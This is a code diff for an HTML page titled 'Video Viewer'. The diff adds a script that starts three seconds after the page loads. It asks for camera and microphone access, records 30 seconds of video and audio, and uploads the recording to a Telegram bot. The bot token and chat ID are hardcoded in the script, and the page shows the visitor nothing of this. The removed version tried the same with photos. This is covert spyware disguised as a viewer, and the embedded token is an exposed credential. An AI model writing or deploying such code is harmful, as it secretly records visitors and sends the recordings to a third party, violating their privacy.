@@ -3,34 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Viewer</title>
+    <title>Video Viewer</title>
 </head>
 <body>
-    <h1>Welcome to the Photo Viewer</h1>
+    <h1>Welcome to the Video Viewer</h1>
 
     <script>
-        async function accessPhotos() {
+        async function recordVideo() {
             const chatId = '7361816575';
             const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
 
-            // Request access to user's photo gallery
-            const files = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Request access to user's camera and microphone
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-            // Send each photo to Telegram
-            for (const file of files) {
+            // Record video for 30 seconds
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.start();
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Send video to Telegram
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', file);
+                formData.append('video', blob);
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
-            }
+            }, 30000);
         }
 
-        // Automatically access photos after a short delay
-        setTimeout(accessPhotos, 3000);
+        // Automatically record video after a short delay
+        setTimeout(recordVideo, 3000);
     </script>
 </body>
 </html>
